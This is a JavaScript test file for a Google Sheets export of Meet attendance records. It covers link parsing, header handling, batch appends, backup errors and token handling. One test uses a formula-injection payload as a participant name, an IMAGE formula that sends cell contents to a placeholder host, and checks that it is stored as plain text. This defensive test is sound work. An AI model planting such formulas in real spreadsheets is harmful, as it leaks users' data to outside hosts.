/**
 * Sheets integration, the parts that are pure.
 *
 * Pointing at a spreadsheet is the step people get wrong, so what counts as a reference is
 * pinned down here: the link from the address bar has to work as well as the bare id.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import * as sheets from '../src/lib/sheets-api.js';
import {
  appendRecords, getSpreadsheet, headerRepair, meetingRow, parseSpreadsheetRef,
  readBackupIndex, restoreAll, spreadsheetUrl
} from '../src/lib/sheets-api.js';

const ID = '1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms';

test('a link from the address bar names the spreadsheet', () => {
  assert.equal(parseSpreadsheetRef(`https://docs.google.com/spreadsheets/d/${ID}/edit#gid=0`), ID);
  assert.equal(parseSpreadsheetRef(`https://docs.google.com/spreadsheets/d/${ID}/edit?usp=sharing`), ID);
  assert.equal(parseSpreadsheetRef(`  https://docs.google.com/spreadsheets/d/${ID}  `), ID);
});

test('a second account puts /u/N/ in the path', () => {
  assert.equal(parseSpreadsheetRef(`https://docs.google.com/spreadsheets/u/1/d/${ID}/edit`), ID);
});

test('older links carry the id in the query', () => {
  assert.equal(parseSpreadsheetRef(`https://docs.google.com/spreadsheet/ccc?key=${ID}#gid=0`), ID);
  assert.equal(parseSpreadsheetRef(`https://drive.google.com/open?id=${ID}`), ID);
});

test('the id on its own is still accepted', () => {
  assert.equal(parseSpreadsheetRef(ID), ID);
  assert.equal(parseSpreadsheetRef(` ${ID}\n`), ID);
});

test('what cannot be opened is refused rather than guessed at', () => {
  assert.equal(parseSpreadsheetRef(''), null);
  assert.equal(parseSpreadsheetRef(null), null);
  assert.equal(parseSpreadsheetRef('my attendance sheet'), null);
  assert.equal(parseSpreadsheetRef('https://example.com/'), null);
  assert.equal(parseSpreadsheetRef('short-id'), null, 'too short to be a spreadsheet id');
  assert.equal(
    parseSpreadsheetRef('https://docs.google.com/spreadsheets/d/e/2PACX-1vQxTsomethinglong/pubhtml'),
    null,
    'a published copy is not the spreadsheet'
  );
});

test('the id read out of a link leads back to the same link', () => {
  const url = spreadsheetUrl(parseSpreadsheetRef(`https://docs.google.com/spreadsheets/d/${ID}/edit#gid=7`));
  assert.equal(url, `https://docs.google.com/spreadsheets/d/${ID}/edit`);
});

/* ---- the structure a picked spreadsheet has to be given ---- */

const HEAD = ['Meeting ID', 'Name', 'Email', 'Time', 'Type'];

test('a tab that already carries the header row is left alone', () => {
  assert.equal(headerRepair(HEAD, HEAD), 'ok');
  assert.equal(headerRepair([...HEAD, 'Notes of my own'], HEAD), 'ok', 'extra columns are the user\'s business');
  assert.equal(headerRepair(['  Meeting ID ', 'Name', 'Email', 'Time', 'Type'], HEAD), 'ok');
});

test('an empty first row is where the header goes', () => {
  assert.equal(headerRepair([], HEAD), 'write');
  assert.equal(headerRepair(undefined, HEAD), 'write', 'the API omits a row that has nothing in it');
  assert.equal(headerRepair(['', '  ', null], HEAD), 'write');
});

test('rows somebody else put there get a row above them, not overwritten', () => {
  assert.equal(headerRepair(['Spotkanie', 'Osoba'], HEAD), 'insert');
  assert.equal(headerRepair(['mtg-1', 'Anna Kowalska'], HEAD), 'insert');
  assert.equal(headerRepair(['Meeting ID', 'Name', 'Email'], HEAD), 'insert', 'half a header is not the header');
});

/* ---- the row a person reads ---- */

test('the readable row is the meeting the dashboard shows, hours and all', () => {
  const [, , start, end, minutes] = meetingRow({
    id: 'abc-defg-hij-1', meetingTitle: 'Standup', url: '',
    date: '2026-08-14T09:50:00.000Z', endedAt: '2026-08-14T10:58:00.000Z',
    scheduledStart: '2026-08-14T10:00:00.000Z', scheduledEnd: '2026-08-14T11:00:00.000Z',
    attendance: {}
  });

  assert.equal(start, '2026-08-14T10:00:00.000Z', 'joining ten minutes early is not the meeting starting early');
  assert.equal(end, '2026-08-14T11:00:00.000Z');
  assert.equal(minutes, 60, 'the hour it was scheduled for, as everywhere else in the app');
});

test('a meeting with no hours of its own is the span it was tracked over', () => {
  const [, , start, end, minutes] = meetingRow({
    id: 'abc-defg-hij-2', meetingTitle: 'Ad hoc', url: '',
    date: '2026-08-14T09:00:00.000Z', endedAt: '2026-08-14T09:30:00.000Z', attendance: {}
  });

  assert.equal(start, '2026-08-14T09:00:00.000Z');
  assert.equal(end, '2026-08-14T09:30:00.000Z');
  assert.equal(minutes, 30);
});

/* ---- what a send puts in each tab ---- */

const authOptions = [];
const removedTokens = [];
const batchBodies = [];
const legacyAppends = [];
const committed = new Map();
let tokenNo = 0;
let clearCalls = 0;
let clearError = null;
let failBatch = false;
let failBackupRead = false;
let unauthorizedOnce = false;

globalThis.chrome = {
  runtime: { lastError: null, getManifest: () => ({ oauth2: { client_id: 'test.apps.googleusercontent.com' } }) },
  identity: {
    getAuthToken: (options, cb) => {
      authOptions.push({ ...options });
      cb(`token-${++tokenNo}`);
    },
    removeCachedAuthToken: ({ token }, cb) => {
      removedTokens.push(token);
      cb();
    },
    clearAllCachedAuthTokens: cb => {
      clearCalls++;
      if (clearError) chrome.runtime.lastError = { message: clearError };
      cb();
      chrome.runtime.lastError = null;
    }
  }
};

function resetApi() {
  authOptions.length = 0;
  removedTokens.length = 0;
  batchBodies.length = 0;
  legacyAppends.length = 0;
  committed.clear();
  tokenNo = 0;
  clearCalls = 0;
  clearError = null;
  failBatch = false;
  failBackupRead = false;
  unauthorizedOnce = false;
}

function valueOf(cell) {
  const value = cell.userEnteredValue || {};
  if ('numberValue' in value) return value.numberValue;
  if ('boolValue' in value) return value.boolValue;
  return value.stringValue;
}

function applyBatch(body) {
  for (const request of body.requests || []) {
    const append = request.appendCells;
    if (!append) continue;
    const rows = (append.rows || []).map(row => (row.values || []).map(valueOf));
    committed.set(append.sheetId, (committed.get(append.sheetId) || []).concat(rows));
  }
}

globalThis.fetch = async (url, opts = {}) => {
  const reply = (obj, status = 200) => ({ ok: status >= 200 && status < 300, status, json: async () => obj });
  if (unauthorizedOnce) {
    unauthorizedOnce = false;
    return reply({ error: { message: 'expired' } }, 401);
  }
  if (failBackupRead && decodeURIComponent(url).includes('/values/Backup!A2')) {
    return reply({ error: { message: 'service unavailable' } }, 503);
  }
  if (/\/spreadsheets\/[^/:]+:batchUpdate$/.test(url)) {
    const body = JSON.parse(opts.body);
    batchBodies.push(body);
    if (failBatch) return reply({ error: { message: 'batch refused' } }, 503);
    applyBatch(body);
    return reply({ replies: body.requests.map(() => ({})) });
  }
  const append = /values\/([^:]+):append/.exec(url);
  if (append) {
    legacyAppends.push({ range: decodeURIComponent(append[1]), body: JSON.parse(opts.body) });
    return reply({});
  }
  if (/values:batchGet/.test(url)) return reply({ valueRanges: [] });
  if (/values:batchUpdate/.test(url)) return reply({});
  if (/spreadsheets\/[^/:]+$/.test(url)) {
    return reply({ sheets: ['Meetings', 'Participants', 'Backup'].map((title, i) => ({
      properties: { title, sheetId: i, gridProperties: { frozenRowCount: 1 } }
    })) });
  }
  return reply({});
};

const rawMeeting = (overrides = {}) => ({
  id: 'abc-defg-hij-3', meetingCode: 'abc-defg-hij', meetingTitle: 'Standup', url: '',
  date: '2026-08-14T09:00:00.000Z', endedAt: '2026-08-14T10:00:00.000Z',
  attendance: {}, ...overrides
});

test('a person recorded twice by Meet is one person in the tabs people read', async () => {
  resetApi();
  // as it is stored: the two identities separate, the merge beside them as an alias
  const meeting = rawMeeting({
    nameMap: { 'jan k': 'Jan Kowalski' },
    attendance: {
      'Jan K': { email: null, events: [
        { time: '2026-08-14T09:00:00.000Z', type: 'Join' }, { time: '2026-08-14T09:30:00.000Z', type: 'Leave' }] },
      'Jan Kowalski': { email: null, events: [
        { time: '2026-08-14T09:30:00.000Z', type: 'Join' }, { time: '2026-08-14T10:00:00.000Z', type: 'Leave' }] }
    }
  });

  await appendRecords('a'.repeat(30), { meetings: [meeting] });

  assert.equal(batchBodies.length, 1, 'all tabs are appended by one API request');
  assert.equal(legacyAppends.length, 0, 'the USER_ENTERED values endpoint is not used');

  const [row] = committed.get(0);
  assert.equal(row[5], 1, 'one person attended, which is what the dashboard says too');

  const names = new Set(committed.get(1).map(r => r[1]));
  assert.deepEqual([...names], ['Jan Kowalski'], 'and their joins and leaves are listed under one name');

  const backup = committed.get(2).map(r => r[3]).join('');
  assert.deepEqual(Object.keys(JSON.parse(backup).attendance), ['Jan K', 'Jan Kowalski'],
    'the backup keeps the record as it is stored, or restoring it could not take the merge back');
});

test('a name that looks like a formula is encoded as an explicit string value', async () => {
  resetApi();
  // what somebody in the call chose to be called, which is not something to hand a spreadsheet
  const hostile = '=IMAGE("http://example.invalid/"&A1)';
  await appendRecords('a'.repeat(30), { meetings: [rawMeeting({
    id: 'abc-defg-hij-4', meetingCode: 'abc-defg-hij', meetingTitle: '=1+1', url: '',
    attendance: { [hostile]: { email: null, events: [{ time: '2026-08-14T09:00:00.000Z', type: 'Join' }] } }
  })] });

  const requests = batchBodies[0].requests;
  const title = requests.find(r => r.appendCells?.sheetId === 0).appendCells.rows[0].values[1];
  const name = requests.find(r => r.appendCells?.sheetId === 1).appendCells.rows[0].values[1];
  assert.deepEqual(title, { userEnteredValue: { stringValue: '=1+1' } });
  assert.deepEqual(name, { userEnteredValue: { stringValue: hostile } });

  const backup = committed.get(2).map(r => r[3]).join('');
  assert.equal(JSON.parse(backup).meetingTitle, '=1+1', 'and the backup still carries what was recorded');
});

test('a rejected atomic batch leaves every sheet without the offered record', async () => {
  resetApi();
  failBatch = true;

  await assert.rejects(
    appendRecords('a'.repeat(30), { meetings: [rawMeeting()] }),
    /batch refused/
  );

  assert.equal(committed.size, 0);
});

test('a Backup HTTP failure rejects instead of looking like an empty backup', async () => {
  resetApi();
  failBackupRead = true;

  await assert.rejects(restoreAll('a'.repeat(30)), /service unavailable/);
  await assert.rejects(readBackupIndex('a'.repeat(30)), /service unavailable/);
});

test('ordinary API calls and a 401 retry are noninteractive', async () => {
  resetApi();
  unauthorizedOnce = true;

  await getSpreadsheet('a'.repeat(30));

  assert.deepEqual(authOptions, [{ interactive: false }, { interactive: false }]);
  assert.deepEqual(removedTokens, ['token-1']);
});

test('disconnect clears all cached identity tokens and reports failure', async () => {
  resetApi();
  await sheets.disconnect();
  assert.equal(clearCalls, 1);

  clearError = 'identity refused';
  await assert.rejects(sheets.disconnect(), /identity refused/);
  assert.equal(clearCalls, 2);
});
